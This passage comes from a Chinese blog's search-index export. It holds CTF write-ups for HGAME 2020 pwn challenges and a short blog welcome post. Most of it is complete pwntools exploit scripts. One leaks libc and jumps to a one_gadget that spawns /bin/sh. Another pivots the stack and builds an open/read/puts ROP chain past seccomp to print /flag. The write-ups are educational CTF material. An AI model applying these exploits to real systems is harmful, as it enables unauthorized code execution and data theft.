len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'你要把C4安放在哪里呢？\n'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="keyword">if</span> is_local:  se(<span class="string">'\x43'</span>)</span><br><span class="line"><span class="keyword">if</span> is_remote: se(<span class="string">'\x08'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">'the bomb has been planted!\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'不如把它宰了，吃一顿大餐，你说吼不吼啊！\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'起个名字:'</span>)</span><br><span class="line">sl(<span class="string">'Imagin'</span>)</span><br><span class="line">ru(<span class="string">'切成几段呢？\n'</span>)</span><br><span class="line">sl(<span class="string">'20'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">ru(<span class="string">'怎么料理呢：'</span>)</span><br><span class="line">sl(p64(i+<span class="number">0xdeadbeef</span>))</span><br><span class="line">ru(<span class="string">'金枪鱼吃了大半。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'的路程是__m:'</span>)</span><br><span class="line">meter = <span class="number">5</span> <span class="comment"># 好像没啥用</span></span><br><span class="line">sl(str(meter))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Terrorist Win\n'</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.hexdump(addr)</span><br><span class="line">info_addr(<span class="string">"ret"</span>,addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    offset_addr = <span class="number">0x20808</span></span><br><span class="line">    offset_one_gadget = <span class="number">0x45216</span></span><br><span class="line"><span class="keyword">if</span> is_local: </span><br><span class="line">    offset_addr = <span class="number">0x26B43</span></span><br><span class="line">    offset_one_gadget =  <span class="number">0x106ef8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">one_gadget = addr - offset_addr + offset_one_gadget</span><br><span class="line">info_addr(<span class="string">'one_gadget'</span>, one_gadget)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'~~！~？~…____\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug('b *'+hex(addr))</span></span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># round2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'你要把C4安放在哪里呢？\n'</span>)</span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line">se(p64(one_gadget)) <span class="comment"># one_gadget</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">'the bomb has been planted!\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'不如把它宰了，吃一顿大餐，你说吼不吼啊！\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'起个名字:'</span>)</span><br><span class="line">sl(<span class="string">'Imagin'</span>)</span><br><span class="line">ru(<span class="string">'切成几段呢？\n'</span>)</span><br><span class="line">sl(<span class="string">'20'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    ru(<span class="string">'怎么料理呢：'</span>)</span><br><span class="line">    sl(p64(i+<span class="number">0xdeadbeef</span>))</span><br><span class="line">ru(<span class="string">'金枪鱼吃了大半。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'的路程是__m:'</span>)</span><br><span class="line">meter = <span class="number">5</span> <span class="comment"># 好像没啥用</span></span><br><span class="line">sl(str(meter))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Terrorist Win\n'</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.hexdump(addr)</span><br><span class="line">info_addr(<span class="string">"ret"</span>,addr)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'~~！~？~…____\n'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><p>week3开题的时候…我正在看CCTV-8直播的绝代双骄，古龙的武侠小说写的真是精彩呀，新版的绝代双骄电视剧的还原度很高，而且排在春节黄金档，焉能不看！于是week3只做了一道题，没想到还拿了2血，剩下的都是堆的题，不会啊…</p><h2 id="ROP-LEVEL2"><a href="#ROP-LEVEL2" class="headerlink" title="ROP_LEVEL2"></a>ROP_LEVEL2</h2><ul><li>题目描述：-</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week3_1/ROP" target="_blank" rel="noopener">ROP</a></li><li>考察点：ROP攻击、栈迁移、<code>seccomp</code></li><li>难度：中等</li><li>分值：200</li><li>完成人数：27</li></ul><h3 id="0x0-背景姿势-1"><a href="#0x0-背景姿势-1" class="headerlink" title="0x0 背景姿势"></a>0x0 背景姿势</h3><p>这题和week1的ROP_LEVEL0差不多，但是开启了<code>seccomp</code>，且栈溢出只有8字节</p><p><code>seccomp</code>用于关闭不必要的系统调用，比如<code>SYSCALL execve</code> </p><h3 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h3><ul><li><p>栈溢出8字节，需要栈迁移</p></li><li><p>用<code>seccomp</code>关闭了<code>SYSCALL execve</code> </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 = seccomp_init(<span class="number">0x7FFF0000</span>LL);</span><br><span class="line">seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">0x3B</span>LL, <span class="number">0L</span>L);</span><br><span class="line">seccomp_load(v0);</span><br></pre></td></tr></table></figure></div></li><li><p>不能用<code>system(&#39;/bin/sh&#39;)</code>，于是用<code>open+read+puts</code>打开<code>/flag</code>文件并打印</p><ul><li><code>open(&#39;/flag&#39;,0,0x100)</code></li><li><code>read(4,bss_base,0x100)</code></li><li><code>puts(bss_base)</code></li></ul></li></ul><h3 id="0x2-exp-2"><a href="#0x2-exp-2" class="headerlink" title="0x2 exp"></a>0x2 exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./ROP'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400a43</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave = <span class="number">0x000000000040090d</span> <span class="comment"># leave ; ret</span></span><br><span class="line">m3c = <span class="number">0x00400a20</span></span><br><span class="line">p6r = <span class="number">0x00400a3a</span></span><br><span class="line">prsi = <span class="number">0x0000000000400a41</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">prbp = <span class="number">0x0000000000400830</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">buf = <span class="number">0x6010a0</span></span><br><span class="line">open_func = <span class="number">0x400985</span></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">open_plt = elf.symbols[<span class="string">'open'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">bss_base = elf.bss() + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">payload = <span class="string">'\0'</span>*offset</span><br><span class="line">payload += p64(buf)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open('/flag',0,0x100)</span></span><br><span class="line">stack = p64(p6r) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(buf+<span class="number">0x8</span>*<span class="number">9</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(buf+<span class="number">0x8</span>*<span class="number">18</span>) + p64(m3c) + p64(open_plt)</span><br><span class="line"><span class="comment"># read(4,bss_base,0x100)</span></span><br><span class="line">stack += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(buf+<span class="number">0x8</span>*<span class="number">17</span>) + p64(<span class="number">0x100</span>) + p64(bss_base) + p64(<span class="number">0x4</span>) + p64(m3c) + p64(read_plt)</span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">stack += <span class="string">'/flag\0\0\0'</span></span><br><span class="line">stack += p64(<span class="number">0xdeadbeef</span>)*<span class="number">5</span></span><br><span class="line"><span class="comment"># pust(bss_base)</span></span><br><span class="line">stack += p64(prdi) + p64(bss_base) + p64(puts_plt) + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line"></span><br><span class="line">ru(<span class="string">'think so?'</span>)</span><br><span class="line">sl(<span class="string">'TaQini!!'</span>+stack)</span><br><span class="line">rc()</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">sl(<span class="string">'TaQini is here~~~'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><p>week4只有两道题，想必是极难的，week3也还剩下3道题，留个坑，以后看。</p><p>(杭电出的题目，水准很高~ 必须点个赞^_^)</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>这次春节蹭新生赛，真是涨了不少姿势，感谢出题的杭电师傅们，感谢<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅的帐号~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> double free </tag>
            
            <tag> ROP </tag>
            
            <tag> unsorted bin leak </tag>
            
            <tag> shellcode </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> shell基础 </tag>
            
            <tag> proc </tag>
            
            <tag> GOT覆写 </tag>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Hexo</title>
      <link href="/2020/02/10/Hello-Hexo/"/>
      <url>/2020/02/10/Hello-Hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h1><blockquote><p>Talk is cheap. Show me the code.</p><p>​                                        ~ Linus Torvalds</p></blockquote><p>最近在搭博客，实在是忍受不了<code>Wordpress</code>具具具丑的代码高亮了<br>鹅且，居然还不支持<code>markdown</code>这么好的语言，于是改用<code>hexo</code>啦~</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hello Hexo"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Markdown is sooooo great!"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hexo is better than wordpress~"</span></span><br></pre></td></tr></table></figure></div><p>这里主要会发一些藕业余参加CTF比赛的writeup，以及一些技术总结，linux使用心得啊什么的<br>欢迎各位小伙伴关注~<br>欢迎师傅们交流、交换友链~</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
